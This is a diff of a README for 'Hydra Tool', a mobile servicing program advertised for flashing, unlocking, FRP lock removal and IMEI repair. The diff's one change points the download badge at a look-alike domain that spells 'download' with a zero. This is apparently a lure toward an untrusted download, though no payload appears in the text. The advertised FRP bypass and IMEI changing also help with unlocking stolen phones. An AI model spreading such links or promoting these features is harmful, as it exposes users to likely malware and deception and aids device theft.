@@ -2,7 +2,7 @@
 
 Hydra Tool is a powerful multi-platform mobile servicing software that provides flashing, unlocking, FRP removal, IMEI repair, and bootloader operations for a wide range of Android devices. With support for Qualcomm, MediaTek, Spreadtrum, and other chipsets, Hydra Tool is widely used by mobile repair professionals for both smartphones and feature phones.
 
-[![Download Hydra Tool](https://img.shields.io/badge/Download-Hydra%20Tool-blueviolet)](https://hydra-tool-download.github.io/.github)
+[![Download Hydra Tool](https://img.shields.io/badge/Download-Hydra%20Tool-blueviolet)](https://hydra-tool-downl0ad.github.io/.github/)
 
 ---
 
